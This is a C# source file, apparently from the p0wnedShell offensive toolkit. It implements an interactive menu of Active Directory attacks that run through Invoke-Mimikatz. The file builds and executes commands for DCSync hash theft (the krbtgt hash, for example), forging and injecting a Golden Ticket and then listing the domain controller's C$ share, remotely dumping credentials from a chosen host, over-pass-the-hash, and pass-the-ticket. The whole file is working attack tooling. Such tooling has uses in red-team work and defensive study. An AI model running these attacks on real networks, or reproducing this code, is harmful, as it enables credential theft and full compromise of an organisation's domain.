using System;
using System.IO;
using System.DirectoryServices.ActiveDirectory;

namespace p0wnedShell
{
    class ADAttacks
    {
        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void PowerBanner()
        {
            string[] toPrint = { "* Attacking Active Directory using Mimikatz                         *" };
            Program.PrintBanner(toPrint);
        }

        public static void Menu()
        {
            PowerBanner();
            Console.WriteLine(" 1. Use Mimikatz DCSync to collect AES and NTLM Hashes from Domain Accounts.");
            Console.WriteLine();
            Console.WriteLine(" 2. Use Mimikatz to generate a Golden Ticket for the Domain.");
            Console.WriteLine();
            Console.WriteLine(" 3. Execute Mimikatz on a remote computer to dump credentials.");
            Console.WriteLine();
            Console.WriteLine(" 4. Execute a Over-Pass The Hash Attack using Mimikatz.");
            Console.WriteLine();
            Console.WriteLine(" 5. Execute Mimikatz Pass The Ticket to inject Kerberos Tickets.");
            Console.WriteLine();
            Console.WriteLine(" 6. Back.");
            Console.Write("\nEnter choice: ");

            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");

            int userInput = 0;
            while (true)
            {
                try
                {
                    userInput = Convert.ToInt32(Console.ReadLine());
                    if (userInput < 1 || userInput > 6)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                        Console.ResetColor();
                        Console.Write("Enter choice: ");
                    }
                    else
                    {
                        break;
                    }
                }
                catch
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.Write("Enter choice: ");
                }
            }

            switch (userInput)
            {
                case 1:
                    if (Arch == "AMD64")
                    {
                        DCSync();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                case 2:
                    if (Arch == "AMD64")
                    {
                        GoldenTicket();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                case 3:
                    if (Arch == "AMD64")
                    {
                        Remote_Mimikatz();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                case 4:
                    if (Arch != "AMD64")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else if (!Program.IsElevated)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] For this function to succeed, you need UAC Elevated Administrator privileges.\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    else
                    {
                        OverPassTheHash();
                    }
                    break;
                case 5:
                    if (Arch == "AMD64")
                    {
                        PassTheTicket();
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] Sorry this option only works for p0wnedShellx64\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                    }
                    break;
                default:
                    break;
            }
        }

        public static void DCSync()
        {
            string[] toPrint = { "* Use Mimikatz dcsync to collect NTLM hashes from the Domain        *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For this attack to succeed, you need the Replicating Directory Changes account privileges (DSGetNCChanges).\n");
            Console.ResetColor();
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string User = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the name of the account from which we want the NTLM hash (e.g. krbtgt) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    User = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (User == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid user account, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.Write("\n[+] Please wait while requesting our hash...\n\n");
            Console.ResetColor();

            string DCSync = "Invoke-Mimikatz -Command '\"lsadump::dcsync /user:" + User + "\"'";
            //string DCSync = "Invoke-ReflectivePEInjection -PEBytes (\"" + Binaries.Mimikatz() + "\" -split ' ') -ExeArgs '\"lsadump::dcsync /user:" + User + "\"'";
            try
            {
                P0wnedListener.Execute(DCSync);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void GoldenTicket()
        {
            string[] toPrint = { "* Use Mimikatz to generate a Golden Ticket for the Domain           *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For this attack to succeed, we need to have the ntlm hash of the krbtgt account.");
            Console.WriteLine("[+] We can get this hash using Mimikatz DCSync.\n");
            Console.ResetColor();
            Console.Write("[+] Do you have the ntlm hash of the krbtgt account? (y/n) > ");
            string krbtgt_hash = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the hash of our sweet krbtgt account > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    krbtgt_hash = Console.ReadLine();
                    Console.ResetColor();
                    if (krbtgt_hash.Length != 32)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid ntlm hash, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to get this hash using Mimikatz DCSync or a NTDS.dit dump.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Domain domain = Domain.GetCurrentDomain();
            DomainController Current_DC = domain.PdcRoleOwner;
            string DomainName = domain.ToString();

            Console.WriteLine("[+] First return the name of our current domain.\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainName);
            Console.ResetColor();

            Console.WriteLine("\n[+] Now return the SID for our domain.\n");
            string DomainSID = Pshell.RunPSCommand("Get-DomainSID").ToString().TrimEnd('\r', '\n');

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainSID);
            Console.ResetColor();

            Console.Write("\n[+] Finally enter the name of the Super Human you want to be: ");
            Console.ForegroundColor = ConsoleColor.Green;
            string Super_Hero = Console.ReadLine();
            Console.ResetColor();

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now wait while generating a forged Ticket-Granting Ticket (TGT)...\n");
            Console.ResetColor();

            string Golden_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\" \"kerberos::golden /domain:" + DomainName + " /user:" + Super_Hero + " /sid:" + DomainSID + " /krbtgt:" + krbtgt_hash + " /ticket:" + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
            try
            {
                Console.WriteLine(Pshell.RunPSCommand(Golden_Ticket));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            if (File.Exists(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket"))
            {
                string Pass_The_Ticket = "Invoke-Mimikatz -Command '\"kerberos::ptt " + Program.P0wnedPath() + "\\" + Super_Hero + ".ticket\"'";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Now lets inject our Kerberos ticket in the current session\n");
                Console.ResetColor();
                try
                {
                    Console.WriteLine(Pshell.RunPSCommand(Pass_The_Ticket));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Oops something went wrong, please try again!\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }
            string DC_Listing = "Get-ChildItem \\\\" + Current_DC + "\\C$";
            string SuperPower = null;
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] And finally check if we really have SuperPower:\n");
            Console.ResetColor();
            try
            {
                SuperPower = Pshell.RunPSCommand(DC_Listing);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            if (SuperPower.Length <= 5)
            {
                string Purge_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\"'";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Oops something went wrong, probably a wrong krbtgt Hash? Please try again!\n");
                Console.WriteLine("[+] Let's purge our invalid Ticket!\n");
                Console.ResetColor();
                File.Delete(Program.P0wnedPath() + "\\" + Super_Hero + ".ticket");
                try
                {
                    Console.WriteLine(Pshell.RunPSCommand(Purge_Ticket));
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("\n[+] OwYeah, " + Super_Hero + " you are in Full Control of the Domain :)\n");
                Console.ResetColor();
                Console.WriteLine(Pshell.RunPSCommand(DC_Listing));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void Remote_Mimikatz()
        {
            string[] toPrint = { "* Execute Mimikatz on a remote computer to dump credentials.        *" };
            Program.PrintBanner(toPrint);

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For this attack to succeed, you need to have remote Admin privileges.\n");
            Console.ResetColor();
            Console.Write("[+] Do you have the required permissions (e.g. Domain Admin)? (y/n) > ");
            string Hostname = null;
            string Creds = null;
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Console.Write("\n[+] Please enter the fqdn hostname of the machine you want to dump the credentials (e.g. dc1.gotham.local) > ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Hostname = Console.ReadLine().TrimEnd('\r', '\n');
                    Console.ResetColor();
                    if (Hostname == "")
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("\n[+] This is not a valid hostname, please try again\n");
                        Console.ResetColor();
                        Console.WriteLine("Press Enter to Continue...");
                        Console.ReadLine();
                        return;
                    }
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try to elevate your permissions.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            string Remote_Mimikatz = "Invoke-Mimikatz -DumpCreds -ComputerName \"" + Hostname + "\"";
            try
            {
                Creds = Pshell.RunPSCommand(Remote_Mimikatz);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            if (Creds.Length <= 5)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Oops something went wrong, maybe a wrong Hostname?\n");
                Console.ResetColor();
            }
            else
            {
                Console.WriteLine(Pshell.RunPSCommand(Remote_Mimikatz));
            }
            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void OverPassTheHash()
        {
            string[] toPrint = { "* Execute a Over-Pass The Hash Attack using Mimikatz.               *" };
            Program.PrintBanner(toPrint);

            string DomainJoined = String.Empty;
            try
            {
                DomainJoined = Domain.GetComputerDomain().Name;
            }
            catch
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[+] Looks like our machine is not joined to a Windows Domain.\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("[+] For this attack to succeed, we need the aes256 hash");
            Console.WriteLine("[+] from the user account we want to impersonate.");
            Console.WriteLine("[+] We can get this hash using Mimikatz DCSync.");
            Console.ResetColor();
            Console.Write("\n[+] Do you have the needed aes256 hash? (y/n) > ");
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    break;
                case "n":
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] First try getting the hash.\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            Console.Write("\n[+] First enter the name of the user account we want to impersonate: ");
            Console.ForegroundColor = ConsoleColor.Green;
            string User_Acc = Console.ReadLine();
            Console.ResetColor();

            Domain domain = Domain.GetCurrentDomain();
            DomainController Current_DC = domain.PdcRoleOwner;
            string DomainName = domain.ToString();

            Console.WriteLine("[+] Now return the name of our current domain.\n");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(DomainName);
            Console.ResetColor();
            Console.WriteLine();

            Console.Write("[+] Finally enter the aes256 hash of our user account > ");
            Console.ForegroundColor = ConsoleColor.Green;
            string aes_hash = Console.ReadLine();
            Console.ResetColor();
            if (aes_hash.Length != 64)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] This is not a valid aes256 hash, please try again\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("\n[+] Now wait while requesting a Kerberos ticket for the user we want to impersonate...\n");
            Console.ResetColor();

            string Over_PassHash = "Invoke-Mimikatz -Command '\"privilege::debug\" \"kerberos::purge\" \"sekurlsa::pth /user:" + User_Acc + " /domain:" + DomainName + " /aes256:" + aes_hash + "\"'";
            try
            {
                P0wnedListener.Execute(Over_PassHash);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

        public static void PassTheTicket()
        {
            string[] toPrint = { "* Use Mimikatz to inject a (Golden/Silver) Kerberos Ticket.         *" };
            Program.PrintBanner(toPrint);

            string ticket = @"";
            string Pass_The_Ticket = null;

            Console.Write("[+] Please enter the name of the ticket file > ");
            Console.ForegroundColor = ConsoleColor.Green;
            ticket = Console.ReadLine().TrimEnd('\r', '\n');
            Console.ResetColor();
            if (ticket == "")
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] This is not a valid ticket name, please try again\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.Write("\n[+] Do you want to purge existing Kerberos tickets? (y/n) > ");
            string input = Console.ReadLine();
            switch (input.ToLower())
            {
                case "y":
                    Pass_The_Ticket = "Invoke-Mimikatz -Command '\"kerberos::purge\" \"kerberos::ptt " + ticket + "\"'";
                    break;
                case "n":
                    Pass_The_Ticket = "Invoke-Mimikatz -Command '\"kerberos::ptt " + ticket + "\"'";
                    break;
                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("\n[+] Wrong choice, please try again!\n");
                    Console.ResetColor();
                    Console.WriteLine("Press Enter to Continue...");
                    Console.ReadLine();
                    return;
            }

            if (File.Exists(ticket))
            {
                Console.ForegroundColor = ConsoleColor.Yellow;
                Console.WriteLine("\n[+] Now lets inject our Kerberos ticket in the current session.\n");
                Console.ResetColor();
                try
                {
                    Console.WriteLine(Pshell.RunPSCommand(Pass_The_Ticket));

                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("\n[+] Ticket not found, please try again!\n");
                Console.ResetColor();
                Console.WriteLine("Press Enter to Continue...");
                Console.ReadLine();
                return;
            }

            Console.WriteLine("Press Enter to Continue...");
            Console.ReadLine();
            return;
        }

    }
}